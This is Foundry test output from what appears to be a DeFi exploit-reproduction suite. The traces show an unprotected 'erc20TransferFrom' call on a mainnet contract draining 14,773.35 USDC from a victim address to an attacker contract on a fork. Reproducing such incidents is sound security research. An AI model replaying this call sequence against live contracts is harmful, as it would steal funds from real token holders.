Compiling 22 files with Solc 0.8.28
Solc 0.8.28 finished in 1.26s
Compiler run successful!

Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 23756)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [7939] ExploitScript::setUp()
    ├─ [0] VM::createSelectFork("mainnet", 1234567 [1.234e6])
    │   └─ ← [Return] 0
    └─ ← [Stop]

  [23756] ExploitScript::testExploit()
    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   └─ ← [Return]
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    └─ ← [Stop]

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 954.65ms (8.06ms CPU time)

Ran 1 test for src/test/2024-10/Erc20transfer_exp.sol:Erc20transfer
[PASS] testExploit() (gas: 97206)
Logs:
  Attacker USDC Balance Before exploit: 0.000000
  Attacker USDC Balance After exploit: 14773.350000

Traces:
  [10740] Erc20transfer::setUp()
    ├─ [0] VM::createSelectFork("mainnet", 21019771 [2.101e7])
    │   └─ ← [Return] 0
    └─ ← [Stop]

  [102006] Erc20transfer::testExploit()
    ├─ [10370] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::symbol() [staticcall]
    │   ├─ [3081] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::symbol() [delegatecall]
    │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000045553444300000000000000000000000000000000000000000000000000000000
    │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000045553444300000000000000000000000000000000000000000000000000000000
    ├─ [3339] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::balanceOf(Erc20transfer: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   ├─ [2553] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::balanceOf(Erc20transfer: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    ├─ [3164] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::decimals() [staticcall]
    │   ├─ [2381] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::decimals() [delegatecall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000006
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000006
    ├─ emit log_named_decimal_uint(key: "Attacker USDC Balance Before exploit", val: 0, decimals: 6)
    ├─ [44179] 0x43Dc865E916914FD93540461FdE124484FBf8fAa::erc20TransferFrom(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, Erc20transfer: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x3DADf003AFCC96d404041D8aE711B94F8C68c6a5, 0)
    │   ├─ [3339] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::balanceOf(0x3DADf003AFCC96d404041D8aE711B94F8C68c6a5) [staticcall]
    │   │   ├─ [2553] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::balanceOf(0x3DADf003AFCC96d404041D8aE711B94F8C68c6a5) [delegatecall]
    │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000003708f6e70
    │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000003708f6e70
    │   ├─ [38049] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::transferFrom(0x3DADf003AFCC96d404041D8aE711B94F8C68c6a5, Erc20transfer: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 14773350000 [1.477e10])
    │   │   ├─ [37254] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::transferFrom(0x3DADf003AFCC96d404041D8aE711B94F8C68c6a5, Erc20transfer: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 14773350000 [1.477e10]) [delegatecall]
    │   │   │   ├─ emit Transfer(param0: 0x3DADf003AFCC96d404041D8aE711B94F8C68c6a5, param1: Erc20transfer: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param2: 14773350000 [1.477e10])
    │   │   │   ├─  storage changes:
    │   │   │   │   @ 0x7bd01edf03b4e912d34d3dd59b8162392c1eb78d6bc9cd4b9b21b3c9691a6846: 0x00000000000000000000000000000000000000000000000000000003708f6e70 → 0
    │   │   │   │   @ 0xc7e3aaf13663a01c05eea5f697617bb5eeca2740e64aa42ce573a1ceb4eb8904: 0x00000000000000b88e282822ab5ed106947c1c60af583c1741a38e858de00000 → 0x00000000000000b88e282822ab5ed106947c1c60af583c1741a38e821d509190
    │   │   │   │   @ 0xea80dd88ed2c8da1b3cfa53b6b2568ae58fe83d484d0c01324a62ba1aa9ffdac: 0 → 0x00000000000000000000000000000000000000000000000000000003708f6e70
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   └─ ← [Stop]
    ├─ [1870] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::symbol() [staticcall]
    │   ├─ [1081] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::symbol() [delegatecall]
    │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000045553444300000000000000000000000000000000000000000000000000000000
    │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000045553444300000000000000000000000000000000000000000000000000000000
    ├─ [1339] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::balanceOf(Erc20transfer: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   ├─ [553] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::balanceOf(Erc20transfer: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000003708f6e70
    │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000003708f6e70
    ├─ [1164] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::decimals() [staticcall]
    │   ├─ [381] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::decimals() [delegatecall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000006
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000006
    ├─ emit log_named_decimal_uint(key: "Attacker USDC Balance After exploit", val: 14773350000 [1.477e10], decimals: 6)
    ├─  storage changes:
    │   @ 0xc7e3aaf13663a01c05eea5f697617bb5eeca2740e64aa42ce573a1ceb4eb8904: 0x00000000000000b88e282822ab5ed106947c1c60af583c1741a38e858de00000 → 0x00000000000000b88e282822ab5ed106947c1c60af583c1741a38e821d509190
    └─ ← [Stop]

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 15.76s (11.10s CPU time)

Ran 2 test suites in 16.86s (16.71s CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
